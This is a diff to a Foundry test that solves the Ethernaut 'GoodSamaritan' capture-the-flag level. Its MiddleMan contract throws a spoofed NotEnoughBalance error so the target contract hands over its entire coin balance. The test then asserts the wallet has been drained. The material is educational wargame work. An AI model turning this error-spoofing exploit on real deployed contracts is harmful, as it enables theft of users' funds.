@@ -4,7 +4,6 @@ pragma solidity ^0.8.0;
 import "forge-std/Test.sol";
 import "src/openzeppelin-ethernaut/GoodSamaritan.sol";
 
-// when amount == 10, revert custom error
 contract MiddleMan is INotifyable {
     error NotEnoughBalance();
 
@@ -12,6 +11,7 @@ contract MiddleMan is INotifyable {
         return GoodSamaritan(prey).requestDonation();
     }
 
+    // revert reverts state changes and thus reversion has to depend on input
     function notify(uint256 amount) external pure {
         if (amount == 10) {
             revert NotEnoughBalance();
@@ -19,6 +19,7 @@ contract MiddleMan is INotifyable {
     }
 }
 
+// behave differently when notify() is called
 contract GoodSamaritanTest is Test {
     GoodSamaritan instance;
 
@@ -28,13 +29,16 @@ contract GoodSamaritanTest is Test {
     }
 
     function test() public {
-        assertEq(Coin(instance.coin()).balances(address(instance.wallet())), 10 ** 6);
+        Coin coin = instance.coin();
+        Wallet wallet = instance.wallet();
+
+        uint256 initialBalance = 10 ** 6;
+        assertEq(coin.balances(address(wallet)), initialBalance);
 
         MiddleMan middleMan = new MiddleMan();
-        bool result = middleMan.attack(address(instance));
-        assertTrue(!result);
+        assertEq(middleMan.attack(address(instance)), false);
 
-        assertEq(Coin(instance.coin()).balances(address(instance.wallet())), 0);
-        assertEq(Coin(instance.coin()).balances(address(middleMan)), 10 ** 6);
+        assertEq(coin.balances(address(wallet)), 0);
+        assertEq(coin.balances(address(middleMan)), initialBalance);
     }
 }
